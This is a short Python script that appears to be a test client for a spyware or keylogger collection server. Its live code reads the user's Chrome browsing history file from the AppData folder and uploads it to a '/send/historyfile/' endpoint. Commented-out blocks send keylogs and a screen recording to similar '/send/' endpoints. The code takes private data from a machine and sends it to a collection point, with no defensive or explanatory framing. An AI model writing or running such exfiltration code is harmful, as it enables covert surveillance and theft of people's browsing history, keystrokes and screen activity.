import requests
from shutil import copyfile
import os

'''
r = requests.get("http://127.0.0.1:8000/send/keylogs/", params={'content': "new user", 'user':"newUser"})
print(r)
print(r.text)
'''

'''
url = 'http://127.0.0.1:8000/send/screenrecords/'
# check_url = 'http://httpbin.org/post'
files = {'record': open('output.avi','rb')}
values = {'user': 'newUser'}

r = requests.post(url, files=files, data=values)
print(r)
print(r.text)
'''

file_src = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\history"
# copyfile(src, dst)
url = 'http://127.0.0.1:8000/send/historyfile/'
# check_url = 'http://httpbin.org/post'
files = {'history': open(file_src,'rb')}
values = {'user': 'newUser'}

r = requests.post(url, files=files, data=values)
print(r)
print(r.text)